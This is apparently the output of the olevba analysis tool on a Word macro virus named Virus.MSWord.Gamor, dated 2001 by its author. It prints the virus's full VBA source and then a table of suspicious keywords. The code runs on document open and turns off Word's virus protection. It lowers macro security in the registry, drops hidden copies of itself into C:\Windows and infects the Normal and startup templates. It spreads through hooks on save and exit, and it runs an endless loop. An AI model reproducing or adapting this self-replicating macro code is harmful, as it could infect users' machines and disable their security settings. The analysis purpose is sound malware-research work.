olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gamor
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Gamor 
in file: Virus.MSWord.Gamor - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Gameover
Sub AutoOpen()
On Error Resume Next
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", " Level ") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
ActiveDocument.VBProject.VBComponents("GameOver").export ("C:\Windows\gameover.drv")
    ActiveDocument.VBProject.VBComponents("frmgameover").export ("C:\Windows\frmgameover.Frm")
    SetAttr ("C:\Windows\gameover.drv"), 6
    Template = Dir("C:\Progra~1\Microsoft Office\Office\STARTUP\GameOver.dot")
    If Template = "" Then
    NormalTemplate.OpenAsDocument
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\GameOver.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\frmgameover.frm")
    ActiveDocument.SaveAs ("C:\Progra~1\Microsoft Office\Office\STARTUP\GameOver.dot")
    NormalTemplate.Saved = True
    ActiveDocument.Close
    
   End If
frmgameover.Show
MsgBox "Its over!" & vbCr & "Its not possible to love somebody who doesn't loves you!" & vbCr & "Nicole,see ya maybe in my next life!?" & vbCr & "I got a new one!Greets to DoctorOwl." & vbCr & "Necronomikon[ZeroGravity]", 64, "*GameOver*"

'thanks Yello for this piece of Code!
Do
CommandBars("Menu Bar").Controls(10).Copy
Loop
End Sub
Sub SpreadBitch()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Gameover").CodeModule.Lines(1, 1) <> "' GameOver" Then
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\GameOver.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\frmgameover.frm")
    ActiveDocument.Save
    End If
End Sub
Sub FileSave()
    On Error Resume Next
    Call SpreadBitch
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Call SpreadBitch
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
Call SpreadBitch
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

'GameOver
'Greets to all i know especially Doctor Owl(She was a bitch you're right)!
'(c)07/18/2001 by Necronomikon[ZeroGravity]

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

